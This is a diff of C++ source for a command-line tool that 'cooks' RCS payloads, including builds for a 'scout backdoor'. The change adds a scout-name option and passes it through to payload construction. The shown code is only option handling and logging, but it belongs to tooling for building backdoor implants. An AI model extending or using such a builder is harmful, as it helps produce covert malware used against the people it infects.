@@ -22,7 +22,7 @@ namespace po = boost::program_options;
 std::string productName;
 std::string productVersion;
 
-int rcs_cook(bf::path rcs_directory, bf::path output_directory, BOOL bScout);
+int rcs_cook(bf::path rcs_directory, bf::path output_directory, BOOL bScout, char *scout_name);
 int generic_cook(bf::path payload_path, bf::path output_directory);
 bool buildStub(RCSConfig& ini);
 bool printProductVersion();
@@ -42,6 +42,7 @@ int main(int argc, char* argv[])
 		("demoimage,d", po::value< string >(), "Demo image")
 		("ofile,O", po::value< string >()->default_value("cooked"), "output file")
 		("scout,S", po::value<string>(), "cook for scout backdoor")
+		("name,N", po::value<string>(), "scout name")
 		("version,V", "product version")
 		;
 	
@@ -97,7 +98,7 @@ int main(int argc, char* argv[])
 		
 		int ret = 1;
 		try {
-			ret = rcs_cook(rcs_directory, output_filepath, FALSE);
+			ret = rcs_cook(rcs_directory, output_filepath, FALSE, NULL);
 		} catch (std::exception &e) {
 			cout << "Cannot cook \"" << rcs_directory << "\": " << e.what() << endl;
 			bf::remove(output_filepath);
@@ -121,8 +122,11 @@ int main(int argc, char* argv[])
 		try
 		{
 			bf::path scout_directory  = vm["scout"].as< string >();
+			char *scout_name = (char *)vm["name"].as< string >().c_str();
+
 			cout << "Input file is " << scout_directory << endl;
-			ret = rcs_cook(scout_directory, output_filepath, TRUE);
+			cout << "Scout name is " << scout_name << endl;
+			ret = rcs_cook(scout_directory, output_filepath, TRUE, scout_name);
 		}
 		catch (std::exception &e) 
 		{
@@ -161,7 +165,7 @@ int generic_cook(bf::path payload_path, bf::path output_file)
 	return 0;
 }
 
-int rcs_cook(bf::path rcs_directory, bf::path output_file, BOOL bScout)
+int rcs_cook(bf::path rcs_directory, bf::path output_file, BOOL bScout, char *scout_name)
 {
 	if ( bf::exists(output_file) )
 		bf::remove(output_file);
@@ -174,9 +178,10 @@ int rcs_cook(bf::path rcs_directory, bf::path output_file, BOOL bScout)
 		}
 
 		try {
+			
 			RCSConfig rcs(rcs_directory, "RCS.ini", bScout);
 			Components components(bScout);
-			RCSPayload payload(rcs, components, bScout);
+			RCSPayload payload(rcs, components, bScout, NULL);
 			payload.write( output_file );
 		} catch (std::exception& e) {
 			cout << "Error cooking: " << e.what() << endl;
@@ -185,12 +190,12 @@ int rcs_cook(bf::path rcs_directory, bf::path output_file, BOOL bScout)
 	}
 	else
 	{
-		cout << "rcs_cook for SCOUT" << endl;
+		cout << "rcs_cook for SCOUT => " << scout_name << endl;
 
 		try {
 			RCSConfig rcs(rcs_directory, "RCS.ini", bScout);
 			Components components(bScout);
-			RCSPayload payload(rcs, components, bScout);
+			RCSPayload payload(rcs, components, bScout, scout_name);
 			payload.write( output_file );
 		} catch (std::exception& e) {
 			cout << "Error cooking: " << e.what() << endl;
